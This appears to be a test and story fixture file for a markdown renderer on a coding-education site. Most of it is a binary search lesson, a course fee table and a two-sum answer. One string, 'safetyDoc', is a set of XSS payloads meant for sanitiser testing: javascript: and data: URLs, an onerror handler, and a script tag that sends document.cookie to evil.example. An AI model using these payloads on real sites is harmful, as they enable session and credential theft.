/* Story and test content. Never exported from the package. */

export const binarySearchAnswer = `## Binary search, step by step

Binary search finds a target in a **sorted** array by halving the search range on every step. Instead of checking each element (*linear* search), you compare against the middle and throw away the half that cannot contain the target.

### The idea

1. Keep two pointers, \`lo\` and \`hi\`, around the part of the array that may still hold the target.
2. Look at the middle element, \`arr[mid]\`.
3. If it is smaller than the target, the target is to the right: move \`lo\` past \`mid\`. Otherwise move \`hi\` to \`mid\`.
4. Stop when the range is empty.

### Code

\`\`\`python
def lower_bound(arr: list[int], target: int) -> int:
    """First index whose value is >= target."""
    lo, hi = 0, len(arr)
    while lo < hi:
        mid = lo + (hi - lo) // 2   # avoids overflow in Java / C++
        if arr[mid] < target:
            lo = mid + 1
        else:
            hi = mid
    return lo
\`\`\`

> **Why \`lo + (hi - lo) // 2\`?** In Python integers never overflow, but in Java or C++ \`(lo + hi) / 2\` can exceed \`Integer.MAX_VALUE\` for large arrays. Build the habit now; interviewers notice.

### Complexity

| Case | Comparisons | Time |
|:--|:-:|--:|
| Best | 1 | O(1) |
| Average | ~log₂ n | O(log n) |
| Worst | ⌈log₂ (n + 1)⌉ | O(log n) |

For **n = 1,000,000** that is at most 20 comparisons, against up to a million for a linear scan.

### Practise next

- [x] Revise the loop invariant (\`arr[lo-1] < target <= arr[hi]\`)
- [x] Solve *Search Insert Position*
- [ ] Solve *Find First and Last Position of Element*
- [ ] Try *Search in Rotated Sorted Array* (Module 6, Problem 4)

---

Stuck? Rewatch the [Module 6 lecture](/academy/modules/6/lectures/2) or read the [Python \`bisect\` docs](https://docs.python.org/3/library/bisect.html).`;

export const feeBreakdown = `### Fee breakdown: Scaler Academy, Cohort 7

| Component | Due | Amount |
|:--|:--|--:|
| Registration fee | At admission | ₹10,000 |
| Instalment 1 | 5 Nov 2026 | ₹1,20,000 |
| Instalment 2 | 5 Feb 2027 | ₹1,20,000 |
| Instalment 3 | 5 May 2027 | ₹1,00,000 |
| **Total** | | **₹3,50,000** |

GST (18%) is included. With the **No-cost EMI** option the same total is split over 12 months at **₹29,167/month**; see [EMI partners](/academy/fees#emi).

> Fine print: the registration fee is refundable only within 7 days of admission.`;

export const safetyDoc = `### Unsafe input, rendered inert

A link with a script URL: [claim your scholarship](javascript:alert('pwned')) (rendered as text).

An entity-obfuscated one: [also a script](&#106;avascript:alert(1)).

A data URL: [open me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==).

An image with a script source: ![Tracking pixel](javascript:alert(1))

Inline HTML: <img src=x onerror="alert('xss')"> and <b onclick="steal()">bold?</b>

<script>fetch('https://evil.example/?c=' + document.cookie)</script>

<iframe src="https://evil.example"></iframe>

Safe for comparison: [Scaler](https://www.scaler.com), [help](mailto:help@scaler.com).`;

export const compactAnswer = `**Short answer:** use a hash map.

Store each number's index as you scan; for every \`x\`, check whether \`target - x\` is already in the map.

\`\`\`js
function twoSum(nums, target) {
  const seen = new Map();
  for (let i = 0; i < nums.length; i++) {
    const need = target - nums[i];
    if (seen.has(need)) return [seen.get(need), i];
    seen.set(nums[i], i);
  }
}
\`\`\`

| Approach | Time | Space |
|:--|--:|--:|
| Brute force | O(n²) | O(1) |
| Hash map | O(n) | O(n) |

- One pass, no sorting
- Works with negatives`;
